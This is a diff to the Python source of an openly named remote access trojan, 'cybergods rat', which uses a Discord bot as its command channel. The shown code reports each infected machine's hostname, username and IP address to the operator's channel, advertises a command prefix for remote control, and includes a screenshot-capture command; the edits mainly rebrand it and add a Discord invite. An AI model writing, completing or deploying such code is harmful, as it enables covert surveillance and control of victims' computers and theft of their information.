@@ -48,18 +48,21 @@ async def on_ready():
     channel = DisFunc.get_channel(1115017737257893888)  # Replace with your desired channel ID 
     user = getpass.getuser()
     ip = GetIP()
-    embed2 = discord.Embed(title="cybergods rat Started", description="Created by linux_adam")
-    embed = discord.Embed(title=':white_check_mark: DisFunc Connection', description='** **', colour=discord.Color.random())
+    
+    embed = discord.Embed(title=':white_check_mark: cybergods rat Connection', description='** **', colour=discord.Color.random())
     embed.add_field(name=f':computer: Hostname: `{hostname}`', value='** **', inline=False)
     embed.add_field(name=f':man: User: `{user}`', value='** **', inline=False)
     embed.add_field(name=':globe_with_meridians: IP: `' + ip + '`', value='** **', inline=False)
     embed.add_field(name=':keyboard: Prefix: `?`', value='** **', inline=False)
+    embed.add_field(name='created by linux_adam', value='** **', inline=False)
     embed.set_footer(text='Credit to [syntheticlol](https://github.com/syntheticlol)')
-    await channel.send(embed=embed2)
+    embed2 = discord.Embed(title='join our discord server', description='https://discord.gg/bdbP4pRT only turkishs', colour=discord.Color.random())
     await channel.send(embed=embed)
-    await channel.send("To execute commands, please respond to bot messages.")
     
-
+    
+    
+    await channel.send(embed=embed2)
+    await channel.send("To execute commands, please respond to bot messages.")
 
 
 
@@ -1143,7 +1146,7 @@ async def screenshot(ctx):
         await ctx.send(f"An error occurred while capturing the screenshot: {str(e)}")
 
 # Replace with your bot token
-loop.create_task(DisFunc.start(''))
+loop.create_task(DisFunc.start('your token here'))
 
 try:
     loop.run_forever()
